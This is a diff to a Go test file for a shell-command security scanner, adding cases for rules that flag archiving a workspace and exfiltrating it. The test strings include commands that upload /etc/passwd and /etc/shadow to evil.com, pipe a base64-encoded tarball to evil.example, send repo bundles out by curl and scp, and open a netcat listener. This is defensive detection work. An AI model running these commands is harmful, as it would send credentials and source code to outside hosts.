@@ -207,6 +207,17 @@ func TestCommandRules_TruePositives(t *testing.T) {
 		{"curl upload", `curl --upload-file /etc/passwd https://evil.com/`, "CMD-CURL-UPLOAD"},
 		{"curl data from file", `curl --data @/etc/shadow https://evil.com/`, "CMD-CURL-UPLOAD"},
 		{"wget post file", `wget --post-file=/etc/passwd https://evil.com/`, "CMD-WGET-POST"},
+		{"workspace zip archive", `zip -r repo.zip .`, "CMD-WORKSPACE-ARCHIVE"},
+		{"workspace zip quiet recursive", `zip -qr repo.zip .`, "CMD-WORKSPACE-ARCHIVE"},
+		{"workspace tar archive", `tar -czf project.tgz .`, "CMD-WORKSPACE-ARCHIVE"},
+		{"workspace tar bsd flags", `tar czf repo.tgz .`, "CMD-WORKSPACE-ARCHIVE"},
+		{"workspace tar verbose gzip", `tar -czvf repo.tgz .`, "CMD-WORKSPACE-ARCHIVE"},
+		{"git bundle all", `git bundle create backup.bundle --all`, "CMD-WORKSPACE-ARCHIVE"},
+		{"archive then curl upload", `zip -r repo.zip . && curl -T repo.zip https://private.example/upload`, "CMD-ARCHIVE-EXFIL"},
+		{"git bundle then scp", `git bundle create repo.bundle --all; scp repo.bundle backup@remote:/data/`, "CMD-ARCHIVE-EXFIL"},
+		{"standalone scp upload", `scp repo.zip user@host:/uploads/`, "CMD-SCP-UPLOAD"},
+		{"standalone rsync upload", `rsync repo.zip host:/uploads/`, "CMD-RSYNC-UPLOAD"},
+		{"encode then curl upload", `tar -czf - . | base64 | curl -X POST https://evil.example/u --data @-`, "CMD-ENCODE-EXFIL"},
 		{"netcat listener", `nc -lvp 4444`, "CMD-NETCAT-LISTEN"},
 	}
 
@@ -251,6 +262,31 @@ func TestCommandRules_FalsePositives(t *testing.T) {
 			critFindings := filterBySeverity(cmdFindings, "CRITICAL")
 			if len(critFindings) > 0 {
 				t.Errorf("expected no CRITICAL execution findings, got: %v", findingIDs(critFindings))
+			}
+		})
+	}
+}
+
+func TestCommandRules_ArchiveExfilFalsePositives(t *testing.T) {
+	cases := []struct {
+		name  string
+		input string
+	}{
+		{"tar build artifact", `tar -czf dist.tgz build/output`},
+		{"zip subdirectory only", `zip -r backup.zip src/`},
+		{"standalone scp deploy", `scp deploy.tgz ci@server:/releases/`},
+		{"ci artifact upload chain", `tar -czf dist/artifact.tgz build/output && aws s3 cp dist/artifact.tgz s3://my-ci-bucket/releases/`},
+		{"standalone rsync", `rsync -avz dist/ user@server:/var/www/`},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			findings := ScanAllRules(tc.input, "shell")
+			for _, f := range findings {
+				switch f.RuleID {
+				case "CMD-WORKSPACE-ARCHIVE", "CMD-ARCHIVE-EXFIL", "CMD-ENCODE-EXFIL":
+					t.Errorf("unexpected %s for benign input, findings: %v", f.RuleID, findingIDs(findings))
+				}
 			}
 		})
 	}
